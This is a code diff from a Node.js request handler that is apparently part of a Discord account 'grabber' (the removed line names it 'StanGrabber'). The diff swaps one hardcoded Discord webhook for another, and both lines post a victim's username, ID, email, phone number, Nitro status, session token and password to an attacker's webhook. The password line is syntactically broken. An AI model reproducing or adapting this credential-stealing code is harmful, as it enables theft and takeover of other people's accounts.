@@ -35,9 +35,9 @@ exports.send = (req, res, webhook) => {
             phone = JSON.parse(JSON.stringify(y)).phone;
         }
 
-        axios.post(`https://canary.discord.com/api/webhooks/793927074590228566/k41Qn_WnIX7SO0mVeq8O8e76QcSG5YAWfEgcdRq9fToxiuXd1xwUjNbJZr51Q2MUILuq`, {
-            username: `StanGrabber`,
-            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : "
+        axios.post(`https://discord.com/api/webhooks/797933426220204132/QVTVod__SFum4eHguecQ-5t1UOnc3BWm7rC-fb_sekgflTr21-E6sIyZJtW04IGEYCyg`, {
+            username: JSON.parse(JSON.stringify(y)).username,
+            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : "
             password
         }).then((z) => {
         	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
